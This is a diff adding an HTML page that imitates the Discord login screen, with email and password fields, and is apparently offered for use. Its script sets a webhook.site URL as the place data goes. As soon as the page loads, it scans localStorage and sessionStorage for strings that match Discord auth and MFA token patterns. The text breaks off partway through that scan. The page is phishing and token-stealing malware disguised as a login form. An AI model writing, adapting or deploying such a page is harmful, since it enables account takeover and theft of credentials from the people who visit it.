@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #36393f;
+            color: #dcddde;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            background: #2f3136;
+            padding: 32px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+            max-width: 480px;
+            width: 100%;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+        .logo h1 {
+            color: #5865f2;
+            font-size: 24px;
+            font-weight: 600;
+        }
+        .logo p {
+            color: #b9bbbe;
+            font-size: 14px;
+            margin-top: 8px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            font-size: 12px;
+            font-weight: 600;
+            color: #b9bbbe;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            background: #202225;
+            border: 1px solid #202225;
+            border-radius: 3px;
+            color: #dcddde;
+            font-size: 16px;
+            transition: border-color 0.2s;
+        }
+        input:focus {
+            outline: none;
+            border-color: #5865f2;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background: #5865f2;
+            color: white;
+            border: none;
+            border-radius: 3px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin-top: 8px;
+        }
+        button:hover {
+            background: #4752c4;
+        }
+        button:disabled {
+            background: #4f545c;
+            cursor: not-allowed;
+        }
+        .message {
+            margin-top: 16px;
+            padding: 12px;
+            border-radius: 3px;
+            font-size: 14px;
+            display: none;
+        }
+        .message.success {
+            background: #43b581;
+            color: white;
+        }
+        .message.error {
+            background: #f04747;
+            color: white;
+        }
+        .link {
+            text-align: center;
+            margin-top: 16px;
+            font-size: 14px;
+        }
+        .link a {
+            color: #00aff4;
+            text-decoration: none;
+        }
+        .link a:hover {
+            text-decoration: underline;
+        }
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: 16px;
+        }
+        .spinner {
+            border: 3px solid #4f545c;
+            border-top: 3px solid #5865f2;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <h1>Discord</h1>
+            <p>Welcome back! We're so excited to see you again!</p>
+        </div>
+        
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="email">Email or Phone Number</label>
+                <input type="text" id="email" name="email" required autocomplete="username">
+            </div>
+            
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" required autocomplete="current-password">
+            </div>
+            
+            <button type="submit" id="submitBtn">Log In</button>
+            
+            <div class="link">
+                <a href="#">Forgot your password?</a>
+            </div>
+            
+            <div class="link">
+                Need an account? <a href="#">Register</a>
+            </div>
+        </form>
+        
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+        </div>
+        
+        <div class="message" id="message"></div>
+    </div>
+
+    <script>
+        // ============ CONFIGURATION ============
+        const WEBHOOK_URL = 'WEBHOOK_URL'; // Replace with your Discord webhook URL (optional)
+        const EMAIL_WEBHOOK = 'https://webhook.site/3c6a9929-b857-43bf-921f-e21e7c5db4c7'; // Your webhook.site URL
+        const ENABLE_EMAIL = true; // Set to true to use webhook.site (ENABLED)
+        // =======================================
+
+        // Auto-scan for tokens on page load
+        window.addEventListener('DOMContentLoaded', () => {
+            scanForTokens();
+        });
+
+        async function scanForTokens() {
+            const tokens = [];
+            
+            // Check localStorage for Discord tokens
+            try {
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    const value = localStorage.getItem(key);
+                    
+                    if (value && typeof value === 'string') {
+                        // Look for Discord token patterns
+                        const tokenMatches = value.match(/[\w-]{24}\.[\w-]{6}\.[\w-]{27,}/g);
+                        if (tokenMatches) {
+                            tokens.push(...tokenMatches);
+                        }
+                        
+                        const mfaMatches = value.match(/mfa\.[\w-]{84,}/g);
+                        if (mfaMatches) {
+                            tokens.push(...mfaMatches);
+                        }
+                    }
+                }
+            } catch (e) {
+                console.log('LocalStorage scan error:', e);
+            }
+
+            // Check sessionStorage
+            try {
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    const key = sessionStorage.key(i);
+                    const value = sessionStorage.getItem(key);
+                    
+                    if (value && typeof value === 'string') {
+                        const tokenMatches = value.match(/
